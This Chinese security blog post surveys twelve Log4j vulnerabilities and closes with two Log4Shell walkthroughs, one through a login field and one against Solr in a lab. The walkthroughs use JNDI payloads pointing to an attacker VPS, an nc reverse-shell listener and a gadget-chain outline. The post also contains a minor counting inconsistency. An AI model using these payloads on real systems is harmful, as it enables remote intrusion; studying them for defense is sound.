#  Log4j框架：1.x-2.x全版本你必须知道的12个通用漏洞（附2个Log4Shell实战案例）  
原创 森林之家zbs
                    森林之家zbs  allby森林之家   2026-09-17 09:39  
  
2026年8月，Apache仓库里冒出一条重磅issue：  
Log4j2的反序列化白名单被绕过了，影响2.11.0到2.26.1的全部版本。  
  
距离第一次Log4Shell那个让全球失眠的2021年，  
这个日志框架已经过去五年了，没想到如今居然还在出漏洞。  
  
Log4j是什么？  
  
Log4j是Apache的开源日志框架，Log4j2是继任者。Java生态里做日志记录的大量项目都在用它，Spring Boot、Struts2、Solr、Elasticsearch、Dubbo这些知名组件底层也都在依赖它。  
  
它不像某些框架那样页面底部有logo，而是藏在底层。但只要目标是个Java应用，大概率就都绑了Log4j2。  
  
为什么日志框架能打RCE？  
  
能RCE的根源是一个叫 **lookup**  
 的功能。Log4j2打印日志时，如果数据里出现 **${xxxx}**  
 这种格式，会把它当资源地址去请求。如果这个地址指向攻击者的LDAP服务，就触发JNDI注入，远程加载恶意class文件执行。  
  
登录框的用户名会记日志，搜索框的关键词会记日志，连HTTP头的User-Agent都会记日志，所以**凡是能被写进日志的输入点都可能被注入。**  
  
![JNDI架构示意图](https://mmbiz.qpic.cn/mmbiz_jpg/2wf8V0A7uBdMgUH9noOicI7U4nOFucgozeAcYxGce47wmNicrBsAdC4qmU3zclKNWCw0E9m4qjJBGgw1Lry4TZ2qPibibxVvVHuib6mpr0tL5qWA/640?wx_fmt=jpeg&from=appmsg "")  
  
JNDI：Java的统一命名接口，能访问RMI、LDAP、DNS等多种服务，允许客户端通过名称查找和共享Java对象。它封装了RMI、LDAP、DNS等多种目录服务的访问逻辑，用统一接口就能访问不同后端。  
  
麻烦在于JNDI支持远程下载class文件构建对象，URL指向谁就找谁下载。如果指向攻击者的服务器，下载的class里藏了恶意代码，加载实例化时就执行了。  
  
![JNDI注入攻击流程图](https://mmbiz.qpic.cn/sz_mmbiz_jpg/2wf8V0A7uBfpAeGuUt94sbG3Auiaf8icubJ0U2q1S9UlUxgtfFxKXo141q8IqoCAyEtUcnJCBNiapdtP9TKoKqrXXDiayJJnicgVWPwJqgTaBYuo/640?wx_fmt=jpeg&from=appmsg "")  
  
完整攻击链：payload写入日志→Log4j解析JNDI→请求LDAP→加载恶意class→RCE  
  
我翻了一遍Log4j整个家族的漏洞史——从1.x到2.x版本，一共出现了12个通用漏洞：  
反序列化、JNDI注入、SQL注入等等，常见的漏洞类型都在这一个框架里集齐了。  
  
今天这篇文章，就按  
Log4j的  
版本线逐个捋过去，每个漏洞单独讲清楚，再模拟黑客来两个实战案例。  
  
Log4j 1.x 时代（6个CVE）  
## 漏洞一：SocketServer反序列化RCE（CVE-2019-17571）  
  
**漏洞类型**  
：远程代码执行（RCE，反序列化）  
  
**CVSS评分**  
：9.8  
  
**影响版本**  
：Log4j 1.2.4 ~ 1.2.17（启用SocketServer时）  
  
**披露时间**  
：2019-12-19  
  
Log4j 1.x的SimpleSocketServer监听端口接收远程日志事件，反序列化时不校验数据。配合ysoserial生成payload，发过去就RCE。CVSS 9.8，离满分差零点二。  
  
![SocketServer反序列化原理图](https://mmbiz.qpic.cn/sz_mmbiz_jpg/2wf8V0A7uBdPyUJBpL5U9HGv2zL615CiaDBic27q64ibVcX3JcCZr5p9jxsrXqDNTpl7bBtBQyaSefDymopibQAJTPyjssOPqEmfJwLz5egp7dg/640?wx_fmt=jpeg&from=appmsg "")  
  
SocketServer反序列化攻击链：攻击者发送序列化对象→SocketServer反序列化→执行gadget链→RCE  
  
SimpleSocketServer的启动代码长这样：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/2wf8V0A7uBeVktDpXxHxkwxToTh72AWIL45UeZJrzJGRRibkswSNcwmKp57XpSfnQNiaczQefHI3299qWASeM9T2VJ7v765VH7jXxo7pbwWzs/640?wx_fmt=png&from=appmsg "")  
  
原理很简单：SocketServer收到数据后调用 **readObject()**  
 反序列化，不做任何类校验。攻击者用ysoserial生成一条CommonsCollections链的序列化对象发过去，readObject触发整条gadget链，最终走到 **Runtime.exec()**  
 执行命令。  
  
2019年就报了，但没几个人关注。等到2021年Log4Shell一炸，大家回头一看：好家伙，1.x早就埋着反序列化的雷了。  
## 漏洞二：JMSAppender JNDI注入（CVE-2021-4104）  
  
**漏洞类型**  
：远程代码执行（RCE）  
  
**CVSS评分**  
：7.5  
  
**影响版本**  
：Log4j 1.2.4 ~ 1.2.17（启用JMSAppender时）  
  
**披露时间**  
：2021-12-14  
  
JMSAppender存在JNDI注入，原理和Log4Shell类似，但绑在1.x上，要配置里启用了JMSAppender才中招。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/2wf8V0A7uBej6axEA0xI35OWFY3icZU2ykfWPfibVcUKGNmsejASPXW7hMqHSib21IFU9b3vIBCRPxibo49a9dklApQmujlx6DEkJqNiaohD6GnI/640?wx_fmt=png&from=appmsg "")  
  
和Log4Shell的区别：Log4Shell是日志内容触发lookup，这个是配置文件里的bindingName触发lookup。利用门槛更高——得先能改配置。但一旦配置被篡改，效果一样是RCE。  
## 漏洞三：JMSSink反序列化RCE（CVE-2022-23302）  
  
**漏洞类型**  
：远程代码执行（RCE，反序列化）  
  
**影响版本**  
：Log4j 1.x 全版本（启用JMSSink时）  
  
**披露时间**  
：2022-01-26  
  
JMSSink组件对不可信数据反序列化，攻击者构造恶意数据实现RCE。和漏洞二是同一个JMS家族，但触发路径不同——漏洞二是配置文件触发JNDI lookup，这个是数据层面的反序列化。  
  
![JMS组件漏洞原理图](https://mmbiz.qpic.cn/mmbiz_jpg/2wf8V0A7uBep1ekpx5avHZHRRf8Aoianyu5cggPhSClAtufaKuDSDGicGJMC6cfW4Bb5Ca9iabqEO6uhxVU4KoMYtYAvsLPID3q5MflibUEicow0/640?wx_fmt=jpeg&from=appmsg "")  
  
Log4j 1.x JMS组件两条攻击路径：JMSAppender走JNDI注入，JMSSink走反序列化  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/2wf8V0A7uBebkEQw81H3ibBa5ZrP7Bib5kG1QHDrRRln987hpFZfnmoib6iaQTaNel1iaX16M6A1MBUkYn58aW2UUKaibD7GBDmUhJ3T7ncQQ24Tc/640?wx_fmt=png&from=appmsg "")  
  
利用条件：攻击者有写Log4j配置权限，或配置引用了含恶意代码的资源。1.x的JMS组件整个就是雷区，JMSAppender走JNDI注入，JMSSink走反序列化，殊途同归都是RCE。  
## 漏洞四：JDBCAppender SQL注入（CVE-2022-23305）  
  
**漏洞类型**  
：SQL注入  
  
**影响版本**  
：Log4j 1.x 全版本（启用JDBCAppender时）  
  
**披露时间**  
：2022-01-26  
  
JDBCAppender把日志写进数据库，但没对内容转义。攻击者构造恶意日志就能注入SQL。11个CVE里唯一不是RCE的。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/2wf8V0A7uBcAiaxVmicyia1vpmT9gw19OuXMBKchGcOI6HGnowGbrETflDFOJ5hqia9rAjmTBtjnQKv0EauZicTcQP6iaqiaPm9THhp60lHxJvd5ck/640?wx_fmt=png&from=appmsg "")  
  
能注入就能拖库，拖库就可能拿到管理员凭据。日志内容本来是用户可控的输入（比如登录框的用户名），开发者一般不会想到日志写库还能被SQL注入。  
## 漏洞五：Chainsaw反序列化RCE（CVE-2022-23307）  
  
**漏洞类型**  
：远程代码执行（RCE，反序列化）  
  
**影响版本**  
：Log4j 1.x 全版本（启用Chainsaw时）  
  
**披露时间**  
：2022-01-26  
  
Chainsaw是Log4j 1.x的日志查看工具，反序列化没做过滤。和漏洞三、漏洞四是同一天披露的——2022年1月26日Apache一口气发了三个1.x的CVE，全是老组件陈年旧账。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/2wf8V0A7uBf123qOoTLhN5EgvYrqiaqSghMe4dtDue6KhVIIfCY74dicp0rC2NW6CMnlNnIqgOKqO7FpGnTNp2FcsScu5gTtwYyNf2kEABgyU/640?wx_fmt=png&from=appmsg "")  
  
Chainsaw的使用场景比SocketServer更窄——得有人主动用它打开恶意配置文件。但在内网渗透中，如果能往目标投递配置文件（比如通过文件共享、邮件附件），也是有利用空间的。  
## 漏洞六：SocketAppender DoS（CVE-2023-26464）  
  
**漏洞类型**  
：拒绝服务（DoS）  
  
**影响版本**  
：Log4j 1.x 全版本（SocketAppender和Chainsaw）  
  
**披露时间**  
：2023年  
  
通过hashmap logging方式触发DoS，导致系统资源耗尽。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/2wf8V0A7uBfMmCBtPZrfM0XdrPE9KBCDU07ZfXEnArKGcdyby7N8mSyaFRDTcrwpV8A9HGeHmgajxUOnQJ29JFib2icN05ziad4rWqrgVcuGJI/640?wx_fmt=png&from=appmsg "")  
  
Apache已停止维护1.x版本，此CVE标记没有补丁，也不会有补丁！  
  
1.x的6个CVE到此捋完，还在用Log4j 1.x的朋友赶快别用了，换2.x！！！  
  
Log4j 2.x 系列（5个CVE + 1个新洞）  
## 漏洞七：SocketAppender反序列化RCE（CVE-2017-5645）  
  
**漏洞类型**  
：远程代码执行（RCE，反序列化）  
  
**影响版本**  
：Log4j 2.x < 2.8.2  
  
**披露时间**  
：2017年  
  
2.x最早的洞。SocketAppender接收远程日志，反序列化不校验，和1.x那个CVE-2019-17571原理一模一样。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/2wf8V0A7uBdMKeqIGVGwlNLTL8JSnzCyWAzqRwRUhaib2zqZujZDZLLLFhkJbj72Fib21SaX9gic1FfLiaEhD2YZrSyibyW02MiazBib9xO8hZNPjA/640?wx_fmt=png&from=appmsg "")  
  
2.8.2版本加了FilteredObjectInputStream白名单做防护——**但这个白名单在2026年被绕过了，后面漏洞十二会讲**  
。  
## 漏洞八：Log4Shell（CVE-2021-44228）—— CVSS 10.0  
  
**漏洞类型**  
：远程代码执行（RCE）  
  
**CVSS评分**  
：10.0（满分）  
  
**影响版本**  
：Log4j 2.0-beta9 ~ 2.14.1  
  
**披露时间**  
：2021-12-09（阿里云安全团队报告）  
  
重头戏。攻击者构造 **${jndi:ldap://恶意服务器/恶意类}**  
 写入日志，Log4j2解析时触发JNDI注入，远程加载恶意class文件执行。**默认配置就受影响，不需要任何特殊条件。**  
  
Spring Boot、Struts2、Solr、Druid、Flink、ElasticSearch、Dubbo、Logstash、Kafka……超6000个中间件全中招。  
  
![Log4j2 JNDI注入攻击流程图](https://mmbiz.qpic.cn/mmbiz_jpg/2wf8V0A7uBdEpUibl0fw0PZ1amhPN51z8hyAEibKId8Rne0UUSQria0s2v6Tuuwm4sI2W2NEyERzA9MkBlLUMaicTvoMUJEsygdFo4hpsialo8U4/640?wx_fmt=jpeg&from=appmsg "")  
  
Log4Shell攻击链：恶意payload→Log4j解析JNDI→LDAP返回恶意引用→下载class→RCE  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/2wf8V0A7uBdDDMYToHGmhEXkgwpia3IPSqeicr91h6eKQ6lAmMt5t8Gia32icQpUEqkeVBloaaxVA2HPJADfuzXOw2DR1hibVViaTv1Xkc4jQlzJ8/640?wx_fmt=png&from=appmsg "")  
  
这个漏洞让整个行业意识到：**连日志框架都可能是攻击入口。**  
 不需要特殊配置，不需要额外组件，只要你的Log4j2版本在范围内，任何能被写进日志的输入都是武器。后面实战一和实战二都会用到这个漏洞。  
## 漏洞九：补丁绕过RCE+DoS（CVE-2021-45046）  
  
**漏洞类型**  
：远程代码执行（RCE）+ 拒绝服务（DoS）  
  
**CVSS评分**  
：9.0  
  
**影响版本**  
：Log4j 2.0-beta9 ~ 2.15.0  
  
**披露时间**  
：2021-12-14  
  
44228的2.15.0补丁只修了LDAP加了host白名单，非默认配置照样绕。五天后就被人翻出来。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/2wf8V0A7uBeD2qWZ31cGDyup6qc1lsL17dRbl1szTCweNMxGqeoZkEtjho2UE70M0HxQcyX8hcXiaZh7lHqNyibvDdIic49j8Kicxh4p09CGxzI/640?wx_fmt=png&from=appmsg "")  
  
补丁没打牢，等于没打。这个CVE说明一个道理：**过滤黑名单永远追不上绕过速度。**  
## 漏洞十：递归DoS（CVE-2021-45105）  
  
**漏洞类型**  
：拒绝服务（DoS）  
  
**CVSS评分**  
：7.5  
  
**影响版本**  
：Log4j 2.0-beta9 ~ 2.16.0  
  
**披露时间**  
：2021-12-18  
  
Pattern Layout用了Context Lookup时，攻击者构造递归查找的恶意输入，触发无限循环，系统崩。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/2wf8V0A7uBdKK7cQl7dUMoz263lLrDjY0nAGib0tTV6QkWWzbxuKOaJkK46DOdhTxWzswicCrQraSiciasicVst1QHTSJJNjBKNCXnGu2SoenvfA/640?wx_fmt=png&from=appmsg "")  
  
默认配置不受影响，只有用了 **${ctx:xxx}**  
 的非默认Pattern Layout才中招。和漏洞九间隔四天，Apache十二天里连发三个补丁版本。  
## 漏洞十一：JDBC Appender JNDI注入（CVE-2021-44832）  
  
**漏洞类型**  
：远程代码执行（RCE）  
  
**CVSS评分**  
：6.6  
  
**影响版本**  
：Log4j 2.0-alpha7 ~ 2.17.0（2.3.2和2.12.4不受影响）  
  
**披露时间**  
：2021-12-28  
  
要攻击者有改配置文件的权限，通过JDBC Appender引用JNDI URI触发注入。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/2wf8V0A7uBfm7U8XMzhVyVa9lCtpaWzbfP0HpmQ7iczjqMekyxvR4pUWeg3fpk5Kpfdfkib0Dv22mZOGCnlDwsslTL7fIsPF0YwxQ9x0e2aqI/640?wx_fmt=png&from=appmsg "")  
  
利用门槛高——能改配置了还用得着靠Log4j打？但配置文件可能被其他途径篡改，所以CVE还是给了6.6分。注意这个是2.x的JNDI注入，和1.x那个CVE-2022-23305（SQL注入）是两码事。  
## 漏洞十二：FOIS白名单绕过（2026年，暂无CVE编号）  
  
**漏洞类型**  
：远程代码执行（RCE，反序列化白名单绕过）  
  
**影响版本**  
：Log4j 2.11.0 ~ 2.26.1（Apache issue [#4255]()  
）  
  
**披露时间**  
：2026年8月  
  
**补丁状态**  
：未修复，无CVE编号  
  
前面讲CVE-2017-5645时提到，2.8.2加了FilteredObjectInputStream（FOIS）白名单。2026年8月，这个白名单被绕过了。  
  
![FOIS白名单绕过原理图](https://mmbiz.qpic.cn/mmbiz_jpg/2wf8V0A7uBcI9Kzk5Vxb6z8OWxHGia13MSakmiabkqvhYENkRSBJGVKGqf98icbOcITDAQVILlYHlgnagiaZYGWH53LXwHQIrU4o4ib546gOBibJs/640?wx_fmt=jpeg&from=appmsg "")  
  
FOIS白名单绕过链：LogEventProxy→MarshalledObject→get()无过滤流→gadget触发RCE  
  
白名单里放行了：  
  
 **java.rmi.MarshalledObject**  
  
这个类把载荷存成不透明byte数组，白名单只看到类名，看不到里面的内容。MarshalledObject的get()方法会在一个**完全无过滤**  
的流里反序列化这段字节，Log4j的LogEventProxy反序列化时又自动调这个get()。等于Log4j自己把恶意载荷送进了无防护的通道。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/2wf8V0A7uBf5kZUEU149aEPzxHYyibkic0bPABIom5ibBw2UFOnd1Ywnq4gOpy7lOLRPicfriawfdDgMrN4RqqRU7eRo5v0jHiacyEmQwRqGU3ZEc/640?wx_fmt=png&from=appmsg "")  
  
// 攻击链结构：三层嵌套序列化  
// 第一层：LogEventProxy（FOIS白名单放行）  
LogEventProxy →   
readResolve()  
 →   
message()  
// 第二层：MarshalledObject（白名单放行）  
marshalledMessage.get() →   
new ObjectInputStream(objBytes)  
// 第三层：恶意gadget藏在objBytes中（白名单看不到）  
objBytes → HashSet.readObject → TiedMapEntry.hashCode     → LazyMap.get → ChainedTransformer → InvokerTransformer     →   
Runtime.exec(cmd)  
// 关键：message()方法吞掉所有异常并回退到SimpleMessage  
// → 攻击完全静默，日志照写、业务照跑  
  
message()方法还会吞掉异常回退到SimpleMessage——**攻击静默完成，接收端日志照写、业务照跑。**  
  
但别慌过头了，Log4Shell记一条日志字符串就触发，这个要TCP直连一个暴露的FOIS接收端，而且classpath上还得有gadget库（如commons-collections 3.2.1）  
## 实战案例一：著名的Log4Shell  
  
理论讲完了，接下来上实战！  
  
开局一个登录框：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/2wf8V0A7uBdWSk0RMaLiaYvdqv92G5u5YWI48I8smRoHnvEHH5NyVarApJRWibKbSrJyDjWRsy3RbYC0mRLaas039ADvyDM2OAv9M5xK4vuy8/640?wx_fmt=png&from=appmsg "")  
  
抓包看正常请求：  
  
username=admin&password=123456，服务器返回200。  
  
然后上DNSlog验证。dnslog.cn点一下拿到子域名 **9c5c3w.dnslog.cn**  
：  
  
![DNSlog获取子域名](https://mmbiz.qpic.cn/mmbiz_jpg/2wf8V0A7uBfmmpAfnoicS3rRsul7aHBwica9YUdcUdFTIUn7wmSTQ2WBeDqPkwDvjR0EV4YxpqcnYzCqomtT32Y2vWd9zaWX5PsW1DIfRLG98/640?wx_fmt=jpeg&from=appmsg "")  
  
username填：  
  
**${jndi:ldap://9c5c3w.dnslog.cn}**  
  
点登录：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/2wf8V0A7uBer8j80iac61fZMOFmFExiaCT8vhFl7zHciaibsZibDxBxNkOoL4jXZYtLWfMAsnwm8rygIxXMVtk20IFxSue6K5B8kR7qXQLSMrArE/640?wx_fmt=png&from=appmsg "")  
  
username字段注入JNDI payload  
  
回DNSlog刷新，一条DNS查询记录回来了：  
  
![DNSlog收到DNS请求](https://mmbiz.qpic.cn/sz_mmbiz_jpg/2wf8V0A7uBdawCANsicFLHVD3JgM5oRkLJWia8ob2Ewp1Ay2Insic713U7Ag1g1iaL8Pq7vdsnlZNWm6nlC6rL0u57cewIAE4ibEKp9Qz7UL5yVQ/640?wx_fmt=jpeg&from=appmsg "")  
  
DNSlog收到目标IP的DNS查询  
  
确认漏洞存在，上JNDI-Injection-Exploit。先看Java版本：  
  
![Java版本确认](https://mmbiz.qpic.cn/sz_mmbiz_jpg/2wf8V0A7uBcFRuORZjgXhvH37C0c0mVqHNVibf5qAXDT6cuxTsoCudAszd7w4AgGEm6NYqASrYnt3waA38gPASLiclVlAdjsQrqEANCGQRfEk/640?wx_fmt=jpeg&from=appmsg "")  
  
OpenJDK 1.8.0_362  
  
运行工具，传base64编码的反弹shell，自动生成RMI和LDAP链接，同时开三个端口（Jetty 8180、RMI 1099、LDAP 1389）：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/2wf8V0A7uBfVPwBk8iaD3APdWb2ribtasNB7Cw4tHqPiciaAjCKo0gDMgo3fmrqY0o7UW5uIvDCHDXaLP3hLcpWaesBfiaRhy9ib1aiabwibHZgU8Xg/640?wx_fmt=png&from=appmsg "")  
  
工具生成利用链接，适配JDK 1.7/1.8/Tomcat环境  
  
VPS开nc监听：  
  
![nc监听6666端口](https://mmbiz.qpic.cn/sz_mmbiz_jpg/2wf8V0A7uBcPl5wiagwcljl3ouxoouo5AUgicUic0MRyKMgv8JfmBCFIqSByv32OsibBKQS4MLN0Xqb6L3HLUbbM7Erq5AmK0TUJUJHVyBvib0rc/640?wx_fmt=jpeg&from=appmsg "")  
  
nc -lvvp 6666  
  
username改成：  
  
 **${jndi:rmi://VPS:1099/xxxxxx}**  
  
发送后nc响了：  
  
![](https://mmbiz.qpic.cn/mmbiz_png/2wf8V0A7uBcSUNBu7nLR8YgmAHwcB9pA5Y8qc7ur6vhhnuaF38Wny5fN6FlU7eADnEX68DKJHfqribNvicQGv8Zc9Ls6TmKF1DiaeblibqH8icjc/640?wx_fmt=png&from=appmsg "")  
  
root shell到手  
  
五步总结：登录页→抓包→DNSlog验证→工具起服务→nc拿shell。  
  
这套流程对Log4Shell通用，换个目标也一样。  
## 实战二：Vulfocus Solr JNDI注入  
  
Solr是Apache的企业级搜索平台，底层绑了Log4j2，同样吃Log4Shell。  
  
构造POST请求，打 **/solr/admin/cores**  
 接口，action参数塞JNDI payload：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/2wf8V0A7uBd6BmTOxkaDhPFUwvGNibhU4bv5DURagv3tJR0icFb6R0fQGI8K3l19UeDX9SgF4XIicW2yxk9Rx3T0IXcRqsyVeIqpe7OmCHV8kw/640?wx_fmt=png&from=appmsg "")  
  
向Solr cores接口发JNDI注入  
  
nc监听等反弹shell：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/2wf8V0A7uBeCvMy2sKzXIehRl0ia6cEWsMngoTZOgoPyXR6eicpd6K5ETtFOQPGYtRlSIsmczBN6vbib9x2V4oG7nWY5K5QbiboVNMsrsHpvAHc/640?wx_fmt=png&from=appmsg "")  
  
nc监听6969，Solr容器反弹root shell到手  
  
浏览器那边返回400，Solr报了个"操作不支持"的异常。但nc已经拿到root了：  
  
![Solr JNDI注入成功getshell](https://mmbiz.qpic.cn/sz_mmbiz_jpg/2wf8V0A7uBdQdeuIqdL3mf7iabyUgt1aib6EruQVGyP6bM9wRk9HthkJ6sS7EaHicJrBspjEtRU3T3xKrRBF1aBlPnlB4qP5JjOYdPJq2f6tIY/640?wx_fmt=jpeg&from=appmsg "")  
  
前端400报错，后端shell已到手，所以前端报错不等于后端没执行。  
   
  
Log4j2在记录这条日志的瞬间就解析了JNDI，LDAP返回恶意引用，目标下载class文件实例化，反弹shell已经跑完了。Solr的400只是它不认识那个action参数。  
  
另外说几个实战技巧，可以用ceye.io替代DNSlog，DNS记录里能带出Java版本号：  
  
![ceye.io DNS记录显示Java版本](https://mmbiz.qpic.cn/sz_mmbiz_jpg/2wf8V0A7uBcgaPblfqN8Zo2gH4BQyrzOLEI6Kytia55ic2FInN3RuRkuRvDKMk4a2g44pG0SJmPx69shR69oHp7BjsV1UJCdve7n02yUsmw6Y/640?wx_fmt=jpeg&from=appmsg "")  
  
ceye.io记录显示目标Java 1.8.0_102  
  
Burp Repeater里直接在响应里看到命令执行结果，root和ok都回来了：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/2wf8V0A7uBdFQwsITqicQnro71FqkJPCrs54Lz7U9af355yD6dGXGOmGxgpDfuPkiaJg13al91DibobY28Ox3h1pAkHrWkeBqOKdT7t6abutoE/640?wx_fmt=png&from=appmsg "")  
  
响应里返回root和ok。浏览器访问攻击者的HTTP服务，能看到投递的Exp.class。  
  
JNDI-Injection-Exploit不行的话可以换marshalsec，一样能打：  
  
![marshalsec工具利用成功](https://mmbiz.qpic.cn/sz_mmbiz_jpg/2wf8V0A7uBfDnYTW7WlFqjbTTypibUQ54uFaLXuK9Gw5WnEmB4HHmM4esDfianz54BrgutDhGenYp9ubGz0Uu2vLoOibm68LpsJb2jwIV3yWgE/640?wx_fmt=jpeg&from=appmsg "")  
  
marshalsec起LDAP服务，反弹shell成功  
## 修复和缓解  
  
**Log4j 2.x**  
：升到2.17.1（Java 8+）、2.12.4（Java 7）、2.3.2（Java 6）。2.17.1修完2021年所有已知漏洞。但2.11.0到2.26.1仍受2026年FOIS绕过影响，官方还没出补丁。  
  
**Log4j 1.x**  
：没有补丁也不会有补了。**迁移到2.x是唯一出路！**  
  
如果暂时不能迁移的，把JMSAppender、SocketServer、Chainsaw、JDBCAppender从classpath里移掉，至少能减少点攻击面吧～  
## 最后总结  
  
2017年的Socket反序列化RCE，2021年的Log4Shell引爆全球，2026年的FOIS白名单绕过。  
  
Log4j的漏洞史已经写了快十年了，但我相信这还远远没有写完。  
  
相比于这些漏洞的打法，更值得让人记住的是教训。  
  
Log4Shell告诉人们不要信任日志内容，FOIS绕过告诉人们不要信任白名单，每多一层"看起来安全"的机制，就可能多一条绕过的路。  
  
你们在做项目的时候碰到过Log4j的漏洞吗？有没有打过文章里提到的版本？评论区大家可以聊聊看～  
  
**【免责声明**  
：本文仅供安全学习与研究交流，请勿对未授权系统进行测试。利用文中技术对未授权系统发起攻击的，由行为人自行承担全部法律责任】  
  
  
其他​框架​漏洞​直通车：  
  
[ThinkPHP框架：2.x-8.x全版本必须知道的10个通用漏洞（附实战getshell案例）](https://mp.weixin.qq.com/s?__biz=Mzg3NjY2NTYzOQ==&mid=2247485364&idx=1&sn=61a2b7006525bba0f30490dcf7e8d33e&scene=21#wechat_redirect)  
  
  
[每日一学：阿里Druid连接池，你必须知道的三个通用漏洞](https://mp.weixin.qq.com/s?__biz=Mzg3NjY2NTYzOQ==&mid=2247485297&idx=1&sn=b7cb7198083fe786c15944fadc9d3971&scene=21#wechat_redirect)  
  
  
[每日一学：若依（Ruoyi）框架，你必须知道的四个通用漏洞](https://mp.weixin.qq.com/s?__biz=Mzg3NjY2NTYzOQ==&mid=2247485220&idx=1&sn=96dd11d4702e81d521d3f0259d2d6233&scene=21#wechat_redirect)  
  
  
[每日一学：struts2框架，你必须知道的几个通用漏洞](https://mp.weixin.qq.com/s?__biz=Mzg3NjY2NTYzOQ==&mid=2247484456&idx=1&sn=0ade9ec80ceca9e185191d71c6c4cafa&scene=21#wechat_redirect)  
  
  
[shiro框架，你必须知道的三个通用漏洞](https://mp.weixin.qq.com/s?__biz=Mzg3NjY2NTYzOQ==&mid=2247484109&idx=1&sn=66304cb00291fd6409eaa54b0f9c362a&scene=21#wechat_redirect)  
  
  
  
